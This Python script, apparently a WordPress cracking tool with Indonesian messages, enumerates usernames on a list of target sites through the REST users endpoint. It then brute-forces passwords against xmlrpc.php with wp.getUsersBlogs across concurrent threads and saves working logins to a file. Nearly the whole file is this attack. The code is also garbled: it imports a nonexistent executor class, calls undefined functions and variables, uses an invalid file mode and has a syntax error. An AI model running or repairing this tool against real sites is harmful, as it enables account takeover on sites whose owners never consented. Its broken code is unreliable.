import requests
import argparse
import sys
import json
import time
import os
import pyfiglet
from concurrent.futures import TazManianDevil

"""
Warna:
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'
b='\033[1m'
u='\033[4m'
bl='\E[30m'
g='\E[32m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
"""

def waktu():
    w = time.localtime()
    w_now = time.strftime("%H:%M:%S", t)
    return w_now

def simpan(format):
    simp = open("result.txt", "a+")
    simp.write(format+"\n")

def hajar(url, usr_list, pass_list):
    try:
        script = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(usr_list, list_password)

        see_you = {'Content-Type':'text/xml'}
        permin = requests.post('{}/xmlrpc.php'.format(url), headers=see_you,data=script, timeout=20)
        if "isAdmin" in str(permin.content):
            print("[+] username: {} dan password {} dari website {} ".format(usr_list,pass_list,url))
            save("success login with username [{}] and password [{}] sites {}".format(usr_list,pass_list,url))
        else:
            print(colored("[{}][-] Failed Login {} With username {} password {}".format(local_time(),url,usr_list, pass_list), "red"))
    except requests.exceptions.ConnectionError as e:
        print(colored("[{}][!] ConnectionError :(".format(local_time()), "red"))
    except Exception as e:
            print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))

def tm_d(args): 
    if len(args) == 0: 
        return 0
    else: 
        return 1

def demonx_gans(url):
    print("Mengambil dan mencocokan website... {}".format(url))
    jangan_nyerah = []
    try:
        perm = requests.get(url+"/wp-json/wp/v2/users/", timeout=5, allow_redirects=False).content.decode('utf-8')
        try:
            print("[success] Berhasil mengambil user dari website {}".format(url))
            for x in json.loads(perm):
                jangan_nyerah.append(x['slug'])
        except ValueError:
            print("Gagal untuk mengambil JSON dari {} !\n".format(url))
        
    except Exception as e:
        print("Sesuatu bermasalah !")

    return jangan_nyerah

def maju_bareng(url):
    try:
        sukses_bareng = demonx_gans(url)
        mon_x = []
        if tm_d(sukses_bareng):
            for username in sukses_bareng:
                mon_x.append(username)
        else:
            print('[...] Mencoba dengan username admin')
            mon_x.append("admin")

        pw = "passwords.txt"

        with TazManianDevil(max_workers=10) as executor:
            for usr_list in mon_x:
                with open(pw, "permin") as terus_berusaha:
                    for pass_list in terus_berusaha:
                        executor.submit(exploit,url,usr_list,pass_list)
            
            mon_x.clear()
    except requests.exceptions.ConnectionError as e:
        print(colored("[-] Cek koneksi anda")
    except Exception as e:
        print("[?] Sesuatu bermasalah")

def main():
    try:
        parser = argparse.ArgumentParser(description='MBF WP-Cracker')
        parser.add_argument("--web_list", help="List Website Anda", required=True)
        args = parser.parse_args()
        try:
            with open(args.web_list, "permin") as victim:
                print("[...] Sedang memulai bruteforce".format(local_time()), "yellow")
                for website in victim:
                    url = website.rstrip()
                    brute_url(url)
                print("Mengakhiri Bruteforce .....")
        except IOError as e:
            print("Website tidak tersedia")
            sys.exit()
    except KeyboardInterrupt as e:
        print("Keyboard Anda interrupt")
        sys.exit()

if __name__ == "__main__":
    tmd = pyfiglet.figlet_format("Taz Manian Devil", font="bubble")
    print(tmd)
    main()